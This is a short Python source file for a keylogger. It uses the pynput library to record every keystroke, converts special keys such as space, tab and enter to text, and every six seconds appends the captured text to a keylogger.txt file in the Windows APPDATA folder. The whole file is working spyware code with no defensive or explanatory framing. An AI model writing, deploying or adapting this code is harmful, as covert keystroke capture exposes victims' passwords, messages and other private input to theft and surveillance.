import pynput.keyboard
import threading
import os
keys=""
def process_key(key):
    global keys

    try:
        keys=keys+str(key.char)
    except AttributeError:
        if str(key) == "Key.space":
            keys=keys+" "
        elif str(key) == "Key.tab":
            keys=keys+"     "
        elif str(key) == "Key.enter":
            keys=keys+"\n"
        elif str(key) == "Key.shift":
            keys = keys + ""
        elif str(key) == "Key.left":
            keys = keys + ""
        elif str(key) == "Key.right":
            keys = keys + ""
        elif str(key) == "Key.down":
            keys = keys + ""
        elif str(key) == "Key.up":
            keys = keys + ""
        else:
            keys=keys+" "+str(key)+" "



path=os.environ["appdata"]+"\\keylogger.txt"

def printKeys():
    global keys
    global path
    with open(path, "a") as file:
        file.write(keys)
    file.close()
    keys=""
    timer=threading.Timer(6,printKeys)
    timer.start()


def start():
    listener = pynput.keyboard.Listener(on_press=process_key)
    with listener:
        printKeys()
        listener.join()


